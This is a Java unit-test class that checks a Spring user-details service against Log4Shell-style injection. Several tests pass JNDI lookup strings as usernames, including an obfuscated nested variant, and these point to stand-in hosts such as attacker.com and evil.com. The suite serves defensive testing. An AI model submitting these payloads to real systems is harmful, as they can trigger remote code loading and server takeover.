package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
public class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    private User testUser;

    @BeforeEach
    public void setUp() {
        testUser = new User();
        testUser.setId(1L);
        testUser.setUsername("testuser");
        testUser.setPassword("encodedPassword");
        testUser.setEnabled(true);
    }

    @Test
    public void testLoadUserByUsername_WithJNDIInjectionAttempt_ShouldNotThrowException() {
        String maliciousUsername = "${jndi:ldap://exploit-server:1389/serial/CommonsCollections}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        verify(userService, times(1)).findByUsername(maliciousUsername);
    }

    @Test
    public void testLoadUserByUsername_WithLog4ShellPayload_ShouldNotThrowException() {
        String log4shellPayload = "${jndi:ldap://attacker.com/a}";
        
        when(userService.findByUsername(log4shellPayload)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(log4shellPayload);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        verify(userService, times(1)).findByUsername(log4shellPayload);
    }

    @Test
    public void testLoadUserByUsername_WithNestedJNDIPayload_ShouldNotThrowException() {
        String nestedPayload = "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}";
        
        when(userService.findByUsername(nestedPayload)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(nestedPayload);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        verify(userService, times(1)).findByUsername(nestedPayload);
    }

    @Test
    public void testLoadUserByUsername_WithNormalUsername_ShouldWork() {
        String normalUsername = "normaluser";
        
        when(userService.findByUsername(normalUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(normalUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        verify(userService, times(1)).findByUsername(normalUsername);
    }

    @Test
    public void testLoadUserByUsername_WithNonExistentUser_ShouldThrowException() {
        String username = "nonexistent";
        
        when(userService.findByUsername(username)).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(username);
        });
        
        verify(userService, times(1)).findByUsername(username);
    }

    @Test
    public void testLoadUserByUsername_WithMultipleJNDIPatterns_ShouldNotThrowException() {
        String multiplePatterns = "${jndi:ldap://a.com/x}${jndi:rmi://b.com/y}";
        
        when(userService.findByUsername(multiplePatterns)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(multiplePatterns);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        verify(userService, times(1)).findByUsername(multiplePatterns);
    }
}
